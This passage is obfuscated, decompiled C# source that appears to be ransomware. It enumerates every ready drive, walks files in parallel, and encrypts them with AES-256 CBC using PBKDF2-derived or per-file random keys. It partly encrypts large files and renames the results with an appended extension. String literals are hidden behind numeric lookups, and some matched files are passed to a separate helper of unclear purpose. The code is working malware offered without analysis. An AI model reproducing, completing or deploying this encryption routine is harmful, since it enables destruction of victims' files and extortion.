				streamWriter.WriteLine(getString_0(107396648));
				streamWriter.WriteLine(AmPZukeXOc(getString_0(107394899)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107394821) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (hNuljeIxIR)
			{
				try
				{
					File.AppendAllText(hGxNuUuVHRPb, getString_0(107392898) + ex.Message + getString_0(107396648));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void xtGCqKGrJXEIUB(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		qAtqRyNwDK.LMmhpzyLQdyzX CS_0024_003C_003E8__locals0 = new qAtqRyNwDK();
		CS_0024_003C_003E8__locals0.PecobYQVKrlGC = string_1;
		CS_0024_003C_003E8__locals0.bEaNqQrDXAyc = string_2;
		CS_0024_003C_003E8__locals0.fhWQLOgLdjy = string_3;
		CS_0024_003C_003E8__locals0.UXsLiOphxJt = string_4;
		vVDhlTpBNQp = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.fhWQLOgLdjy);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395921))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !ZPFWFitHEOz.Contains(array[i].Name))
					{
						ZPFWFitHEOz.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!ZPFWFitHEOz.Contains(string_0[j]))
				{
					ZPFWFitHEOz.Add(string_0[j]);
				}
			}
		}
		if (ZPFWFitHEOz.Contains(AmPZukeXOc(getString_0(107392297))) && nOizlZFiCOj == getString_0(107396827))
		{
			ZPFWFitHEOz.Remove(AmPZukeXOc(getString_0(107392297)));
		}
		Parallel.ForEach(ZPFWFitHEOz, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new qAtqRyNwDK.LMmhpzyLQdyzX();
			CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.slPVSKPqKApEqp = string_0;
			if (mnLjajuxoQ && !JYmdtNnSqjF().Contains(qAtqRyNwDK.getString_0(107392959)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						tVWzlHZhcvgquxw(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.slPVSKPqKApEqp);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UPjhbLGdmsrc == qAtqRyNwDK.getString_0(107396836))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					XBlPSRuyGIHpK(CS_0024_003C_003E8__locals0.slPVSKPqKApEqp, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.PecobYQVKrlGC, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.UXsLiOphxJt, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.bEaNqQrDXAyc, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.fhWQLOgLdjy);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				XBlPSRuyGIHpK(CS_0024_003C_003E8__locals0.slPVSKPqKApEqp, CS_0024_003C_003E8__locals0.PecobYQVKrlGC, CS_0024_003C_003E8__locals0.UXsLiOphxJt, CS_0024_003C_003E8__locals0.bEaNqQrDXAyc, CS_0024_003C_003E8__locals0.fhWQLOgLdjy);
			}
		});
	}

	public static void XBlPSRuyGIHpK(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107395010));
		List<string> list3 = list2;
		if (nopWpwvsZmQqrg == getString_0(107396284))
		{
			list = CDydoithOcTTNs(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = JafoeRzqNZL.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((bgnupzRljZvH == getString_0(107396284) && !item.EndsWith(text)) || hHVQkDDqNsnqofdX.Contains(item))
				{
					continue;
				}
				if (euXBqdRgcDg == getString_0(107396827))
				{
					try
					{
						if (IgWkBNpKrR.vgGPQsLwSqqRNkHfbM(item))
						{
							IgWkBNpKrR.lYATGCxpNdy(item);
						}
					}
					catch
					{
					}
				}
				hHVQkDDqNsnqofdX.Add(item);
				if (!jEFdDHVEvpn.Contains(Path.GetDirectoryName(item)))
				{
					jEFdDHVEvpn.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (RPquPXOFWaUBv == getString_0(107396827) && fileStream.Length > Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024 && !list3.Contains(text))
					{
						if (hxpzcEFVmmD == getString_0(107396827))
						{
							foreach (string item2 in mxmgbOMGSKJuZ)
							{
								if (item.ToLower().EndsWith(item2) && xKaluVrlFCfiTysX == getString_0(107396827))
								{
									if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395059), getString_0(107395054), getString_0(107395073), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && xKaluVrlFCfiTysX == getString_0(107396284))
								{
									try
									{
										cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395059), getString_0(107395054), getString_0(107395073), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = PlbUICyTgm.uFgRNBuxrJhxWug(item, Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024);
						byte[] qhQaapTyrlC = PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						PlbUICyTgm.slbbArbZqAbLW(item, qhQaapTyrlC);
						if (string_2 != getString_0(107392320))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107392320))
					{
						kQTtSXFTFIS(item, item + string_2, vVDhlTpBNQp);
					}
					else
					{
						kQTtSXFTFIS(item, item + getString_0(107392315), vVDhlTpBNQp);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void oSRIdmvXGSvMw(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		WJEbjQEaFJC.PCYrNQPdZTmV CS_0024_003C_003E8__locals0 = new WJEbjQEaFJC();
		CS_0024_003C_003E8__locals0.fpeXxdanfO = list_0;
		CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ = string_1;
		CS_0024_003C_003E8__locals0.wyrOkLcHkeaQN = string_2;
		CS_0024_003C_003E8__locals0.CoSpOiSxhQnBVH = string_3;
		CS_0024_003C_003E8__locals0.MjbyzCwnSeZjAA = new List<string> { getString_0(107395010) };
		if (bgnupzRljZvH == getString_0(107396284))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.fpeXxdanfO)
				{
					if (CS_0024_003C_003E8__locals0.wyrOkLcHkeaQN.Length != 0)
					{
						string[] wyrOkLcHkeaQN2 = CS_0024_003C_003E8__locals0.wyrOkLcHkeaQN;
						int num2 = 0;
						while (num2 < wyrOkLcHkeaQN2.Length)
						{
							string value2 = wyrOkLcHkeaQN2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !hHVQkDDqNsnqofdX.Contains(item))
					{
						if (euXBqdRgcDg == WJEbjQEaFJC.getString_0(107396844))
						{
							try
							{
								if (IgWkBNpKrR.vgGPQsLwSqqRNkHfbM(item))
								{
									IgWkBNpKrR.lYATGCxpNdy(item);
								}
							}
							catch
							{
							}
						}
						hHVQkDDqNsnqofdX.Add(item);
						if (!jEFdDHVEvpn.Contains(Path.GetDirectoryName(item)))
						{
							jEFdDHVEvpn.Add(Path.GetDirectoryName(item));
						}
						kwRLxOIARCnYa(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (hNuljeIxIR)
								{
									try
									{
										File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + item + WJEbjQEaFJC.getString_0(107409764) + ex12.Message + WJEbjQEaFJC.getString_0(107396665));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (RPquPXOFWaUBv == WJEbjQEaFJC.getString_0(107396844) && new FileInfo(item).Length > Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.MjbyzCwnSeZjAA.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new WJEbjQEaFJC.dYNytZoEInW();
								CS_0024_003C_003E8__locals0.fgGzpoPNWDs = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ);
									}
								}
								catch (Exception ex14)
								{
									if (!hNuljeIxIR)
									{
										break;
									}
									try
									{
										File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + item + WJEbjQEaFJC.getString_0(107409735) + ex14.Message + WJEbjQEaFJC.getString_0(107396665));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.GKfxNAYedVm = WJEbjQEaFJC.getString_0(107395027);
								if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
								{
									CS_0024_003C_003E8__locals0.GKfxNAYedVm = item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.GKfxNAYedVm = item;
								}
								if (hxpzcEFVmmD == WJEbjQEaFJC.getString_0(107396844))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in mxmgbOMGSKJuZ)
										{
											if (CS_0024_003C_003E8__locals0.GKfxNAYedVm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == WJEbjQEaFJC.dYNytZoEInW.getString_0(107396847))
											{
												if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.GKfxNAYedVm).Length)
												{
													try
													{
														cjKqlcIRmlYL.xPWVYXQJNasgW(WJEbjQEaFJC.dYNytZoEInW.getString_0(107395079), WJEbjQEaFJC.dYNytZoEInW.getString_0(107395074), WJEbjQEaFJC.dYNytZoEInW.getString_0(107395093), CS_0024_003C_003E8__locals0.GKfxNAYedVm);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.GKfxNAYedVm.ToLower().EndsWith(item2) && xKaluVrlFCfiTysX == WJEbjQEaFJC.dYNytZoEInW.getString_0(107396304))
											{
												try
												{
													cjKqlcIRmlYL.xPWVYXQJNasgW(WJEbjQEaFJC.dYNytZoEInW.getString_0(107395079), WJEbjQEaFJC.dYNytZoEInW.getString_0(107395074), WJEbjQEaFJC.dYNytZoEInW.getString_0(107395093), CS_0024_003C_003E8__locals0.GKfxNAYedVm);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = RiuevwwWyyAEMr.poGbvXduoUfH(32);
								string s3 = iQJHAMSYRoCeWB.xNEMMZlJueN(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = PlbUICyTgm.uFgRNBuxrJhxWug(CS_0024_003C_003E8__locals0.GKfxNAYedVm, Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024);
								PlbUICyTgm.slbbArbZqAbLW(qhQaapTyrlC: (!MzQcgykXktlmX) ? (bqQwwzlxGWJXq ? PlbUICyTgm.gVuHxnhVsTtn(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PlbUICyTgm.gVuHxnhVsTtn(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (bqQwwzlxGWJXq ? tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), rOoFWYQfcmSy: CS_0024_003C_003E8__locals0.GKfxNAYedVm, pbehLBuafKw: bytes3);
							}
							else
							{
								string text4 = RiuevwwWyyAEMr.poGbvXduoUfH(32);
								string s4 = iQJHAMSYRoCeWB.xNEMMZlJueN(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
								{
									if (!hyVzgCCllZ)
									{
										if (!bqQwwzlxGWJXq)
										{
											bOyNHrBvKPeP(item, item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, vVDhlTpBNQp);
										}
										else
										{
											bOyNHrBvKPeP(item, item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!bqQwwzlxGWJXq)
											{
												eELgwvOhTgW(item, item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, vVDhlTpBNQp);
											}
											else
											{
												eELgwvOhTgW(item, item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (hNuljeIxIR)
											{
												try
												{
													File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + item + WJEbjQEaFJC.getString_0(107392291) + ex16.Message + WJEbjQEaFJC.getString_0(107396665));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!hyVzgCCllZ)
								{
									if (!bqQwwzlxGWJXq)
									{
										bOyNHrBvKPeP(item, item + WJEbjQEaFJC.getString_0(107392332), vVDhlTpBNQp);
									}
									else
									{
										bOyNHrBvKPeP(item, item + WJEbjQEaFJC.getString_0(107392332), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!bqQwwzlxGWJXq)
										{
											eELgwvOhTgW(item, item, vVDhlTpBNQp);
										}
										else
										{
											eELgwvOhTgW(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (hNuljeIxIR)
										{
											try
											{
												File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + item + WJEbjQEaFJC.getString_0(107392291) + ex18.Message + WJEbjQEaFJC.getString_0(107396665));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (bqQwwzlxGWJXq)
								{
									if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
									{
										EJthSefGcXhMJA(item + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, bytes4);
									}
									else
									{
										EJthSefGcXhMJA(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.fpeXxdanfO.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.fpeXxdanfO, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new WJEbjQEaFJC.PCYrNQPdZTmV();
			CS_0024_003C_003E8__locals0.fgGzpoPNWDs = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt = string_0;
			if (CS_0024_003C_003E8__locals0.wyrOkLcHkeaQN.Length != 0)
			{
				string[] wyrOkLcHkeaQN = CS_0024_003C_003E8__locals0.wyrOkLcHkeaQN;
				int num = 0;
				while (num < wyrOkLcHkeaQN.Length)
				{
					string value = wyrOkLcHkeaQN[num];
					if (!CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.EndsWith(CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!hHVQkDDqNsnqofdX.Contains(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt))
			{
				if (euXBqdRgcDg == WJEbjQEaFJC.getString_0(107396844))
				{
					try
					{
						if (IgWkBNpKrR.vgGPQsLwSqqRNkHfbM(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt))
						{
							IgWkBNpKrR.lYATGCxpNdy(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
						}
					}
					catch
					{
					}
				}
				hHVQkDDqNsnqofdX.Add(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
				if (!jEFdDHVEvpn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt)))
				{
					jEFdDHVEvpn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt));
				}
				kwRLxOIARCnYa(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (hNuljeIxIR)
						{
							try
							{
								File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107409764) + ex2.Message + WJEbjQEaFJC.getString_0(107396665));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (RPquPXOFWaUBv == WJEbjQEaFJC.getString_0(107396844) && new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length > Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
							{
								File.Move(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ);
							}
						}
						catch (Exception ex4)
						{
							if (hNuljeIxIR)
							{
								try
								{
									File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107409735) + ex4.Message + WJEbjQEaFJC.getString_0(107396665));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
						{
							CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt += CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ;
						}
						if (hxpzcEFVmmD == WJEbjQEaFJC.getString_0(107396844))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in mxmgbOMGSKJuZ)
								{
									if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107396850))
									{
										if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length)
										{
											try
											{
												cjKqlcIRmlYL.xPWVYXQJNasgW(WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395082), WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395077), WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395096), CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.ToLower().EndsWith(item3) && xKaluVrlFCfiTysX == WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107396307))
									{
										try
										{
											cjKqlcIRmlYL.xPWVYXQJNasgW(WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395082), WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395077), WJEbjQEaFJC.PCYrNQPdZTmV.getString_0(107395096), CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s = iQJHAMSYRoCeWB.xNEMMZlJueN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = PlbUICyTgm.uFgRNBuxrJhxWug(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024);
						PlbUICyTgm.slbbArbZqAbLW(qhQaapTyrlC: (!MzQcgykXktlmX) ? (bqQwwzlxGWJXq ? PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (bqQwwzlxGWJXq ? tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), rOoFWYQfcmSy: CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, pbehLBuafKw: bytes);
					}
					else
					{
						string text2 = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s2 = iQJHAMSYRoCeWB.xNEMMZlJueN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
						{
							if (!hyVzgCCllZ)
							{
								if (!bqQwwzlxGWJXq)
								{
									bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, vVDhlTpBNQp);
								}
								else
								{
									bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!bqQwwzlxGWJXq)
									{
										eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, vVDhlTpBNQp);
									}
									else
									{
										eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (hNuljeIxIR)
									{
										try
										{
											File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107392291) + ex6.Message + WJEbjQEaFJC.getString_0(107396665));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!hyVzgCCllZ)
						{
							if (!bqQwwzlxGWJXq)
							{
								bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107392332), vVDhlTpBNQp);
							}
							else
							{
								bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107392332), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!bqQwwzlxGWJXq)
								{
									eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, vVDhlTpBNQp);
								}
								else
								{
									eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (hNuljeIxIR)
								{
									try
									{
										File.AppendAllText(hGxNuUuVHRPb, WJEbjQEaFJC.getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + WJEbjQEaFJC.getString_0(107392291) + ex8.Message + WJEbjQEaFJC.getString_0(107396665));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (bqQwwzlxGWJXq)
						{
							if (CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ != WJEbjQEaFJC.getString_0(107392337))
							{
								EJthSefGcXhMJA(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + CS_0024_003C_003E8__locals0.hirKHOcivywEBuZ, bytes2);
							}
							else
							{
								EJthSefGcXhMJA(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			CS_0024_003C_003E8__locals0.fpeXxdanfO.Remove(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
		});
	}

	private static void kQTtSXFTFIS(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (hxpzcEFVmmD == getString_0(107396827))
					{
						foreach (string item in mxmgbOMGSKJuZ)
						{
							if (string_0.ToLower().EndsWith(item) && xKaluVrlFCfiTysX == getString_0(107396827))
							{
								if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395059), getString_0(107395054), getString_0(107395073), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && xKaluVrlFCfiTysX == getString_0(107396284))
							{
								try
								{
									cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395059), getString_0(107395054), getString_0(107395073), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
